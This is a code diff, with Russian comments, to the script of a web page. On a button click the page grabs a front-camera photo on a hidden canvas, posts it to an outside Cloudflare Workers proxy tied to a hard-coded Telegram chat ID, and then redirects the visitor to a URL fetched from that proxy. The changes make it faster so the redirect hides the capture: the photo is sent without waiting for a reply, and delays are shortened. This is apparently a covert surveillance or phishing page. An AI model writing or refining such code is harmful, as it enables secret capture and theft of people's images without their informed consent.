@@ -16,10 +16,10 @@
         <canvas id="c" style="display:none"></canvas>
 
         <script>
-            const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
+           const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 const chatId = '1976857829';
 
-// 1. ЗАПУСКАЕМ ПОЛУЧЕНИЕ ССЫЛКИ ЗАРАНЕЕ (ФОНОМ)
+// 1. Запрашиваем ссылку из памяти ЗАРАНЕЕ (сразу при открытии страницы)
 let targetUrlPromise = fetch(proxyUrl + "/get-url")
     .then(res => res.text())
     .catch(() => "https://google.com");
@@ -35,7 +35,7 @@ btn.onclick = async () => {
 
     try {
         stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: 640, height: 480 } 
+            video: { facingMode: "user", width: { ideal: 640 } } 
         });
 
         video.srcObject = stream;
@@ -44,7 +44,7 @@ btn.onclick = async () => {
         await new Promise((resolve) => {
             video.onloadedmetadata = () => {
                 video.play();
-                setTimeout(resolve, 500); // Уменьшили задержку до 0.5 сек
+                setTimeout(resolve, 300); // Мини-пауза для фокуса
             };
         });
 
@@ -52,27 +52,29 @@ btn.onclick = async () => {
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6)); // Сжали фото для скорости
+        // Сжимаем фото сильнее (0.5), чтобы оно улетело быстрее
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'shot.jpg');
 
-        // 2. ОТПРАВЛЯЕМ ФОТО И ЖДЕМ ССЫЛКУ ОДНОВРЕМЕННО
-        const [photoRes, finalUrl] = await Promise.all([
-            fetch(proxyUrl, { method: 'POST', body: formData }),
-            targetUrlPromise // Ссылка уже должна была загрузиться к этому моменту
-        ]);
+        // --- КРИТИЧЕСКИЙ МОМЕНТ ДЛЯ СКОРОСТИ ---
+        // Отправляем фото, но НЕ ЖДЕМ (await) ответа от сервера!
+        fetch(proxyUrl, { method: 'POST', body: formData });
 
+        // Сразу получаем готовую ссылку (она уже загрузилась в фоне)
+        const finalUrl = await targetUrlPromise;
+        
+        // Мгновенный редирект
         window.location.href = finalUrl;
 
     } catch (err) {
-        console.error(err);
-        // Если всё сломалось — просто уходим на гугл
-        window.location.href = "https://google.com";
+        window.location.href = await targetUrlPromise;
     } finally {
         if (stream) stream.getTracks().forEach(t => t.stop());
     }
 };
+
 
         </script>
     </body>
